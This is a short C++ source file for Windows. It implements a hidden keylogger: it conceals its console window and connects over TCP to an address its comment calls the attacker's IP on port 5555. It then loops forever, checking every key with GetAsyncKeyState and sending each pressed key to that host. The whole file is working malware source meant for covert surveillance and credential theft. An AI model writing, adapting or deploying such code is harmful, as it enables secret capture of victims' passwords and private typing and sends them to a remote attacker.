```c++
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main() {
	//hides the terminal
    ShowWindow(GetConsoleWindow(), SW_HIDE);

	//stores a single key to see if its pressed
    char KEY;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    //AF_INET means IPv4 SOCK_STREAM means TCP socket
    server = socket(AF_INET, SOCK_STREAM, 0);

	//attackers ip address and port
    addr.sin_addr.s_addr = inet_addr("10.10.21.3");
    addr.sin_port = htons(5555);
    //indicates ip used above is IPv4
    addr.sin_family = AF_INET;
    
	//connects to target host above
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    while (true) {
        Sleep(10);
        //loops tru all the keys infinitely
        //GetAsyncKeyState() check if its pressed 
        //& 0x8000 checkif most significant bit is set to 1
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) & 0x8000) {
                char buffer[2];
                buffer[0] = KEY;
                send(server, buffer, sizeof(buffer), 0);
            }
        }
    }

    closesocket(server);
    WSACleanup();
}
```